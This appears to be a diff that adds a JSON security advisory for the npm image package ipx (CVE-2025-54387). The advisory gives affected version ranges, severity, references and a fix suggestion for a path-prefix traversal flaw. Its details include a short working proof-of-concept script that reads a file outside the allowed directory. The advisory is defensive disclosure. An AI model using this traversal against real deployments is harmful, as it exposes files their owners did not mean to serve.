@@ -1,0 +1,111 @@
+{
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-mm3p-j368-7jcr/GHSA-mm3p-j368-7jcr.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "ipx",
+        "purl": "pkg:npm/ipx"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.3.2"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-mm3p-j368-7jcr/GHSA-mm3p-j368-7jcr.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "ipx",
+        "purl": "pkg:npm/ipx"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "2.0.0-0"
+            },
+            {
+              "fixed": "2.1.1"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-mm3p-j368-7jcr/GHSA-mm3p-j368-7jcr.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "ipx",
+        "purl": "pkg:npm/ipx"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "3.0.0"
+            },
+            {
+              "fixed": "3.1.1"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
+  "aliases": [
+    "CVE-2025-54387"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-08-04T14:48:25Z",
+    "nvd_published_at": null,
+    "severity": "MODERATE"
+  },
+  "details": "### Summary\n\nThe approach used to check whether a path is within allowed directories is vulnerable to path prefix bypass when the allowed directories do not end with a path separator. This occurs because the check relies on a raw string prefix comparison.\n\n\n### PoC\n\n- setup\n```\nmkdir ~/public123\nmove a png file under ~/public123 with name test.png\ncd\nnpm i ipx \n```\n\n- `main.js`\n```js\nimport { createIPX, ipxFSStorage } from \"ipx\";\n\nconst ipx = createIPX({\n  storage: ipxFSStorage({ dir: \"./public\" }),\n});\n\n\n(async () => { \n    {\n        const source = await ipx(\"../public123/test.png\"); // access file outside ./public dir because of same prefix folder\n        const { data, format } = await source.process();\n        console.log(format) // print image data\n    }\n    {\n        try {\n            const source = await ipx(\"../publi123/test.png\"); // forbidden path: the prefix is not the same\n            const { data, format } = await source.process();\n            console.log(data)\n        } catch (err) {\n            console.log(err.message) // Forbidden path:\n        }\n\n    }\n\n})()\n```\n\n- `node main.js`\n```\npng\nForbidden path: /../publi123/test.png\n```\n\n### Impact\nPath Traversal\n\n### Possible Fix\n\nCheck if the `dir` ends with `/` (path separator) and if not, add before calling `startsWith`",
+  "id": "GHSA-mm3p-j368-7jcr",
+  "modified": "2025-08-04T15:42:15.675764Z",
+  "published": "2025-08-04T14:48:25Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/unjs/ipx/security/advisories/GHSA-mm3p-j368-7jcr"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/unjs/ipx/commit/81693ddbfc062cc922e4e2406e8427ab4e3ad214"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/unjs/ipx"
+    }
+  ],
+  "schema_version": "1.6.0",
+  "severity": [
+    {
+      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:H/SI:L/SA:N",
+      "type": "CVSS_V4"
+    }
+  ],
+  "summary": "IPX Allows Path Traversal via Prefix Matching Bypass"
+}
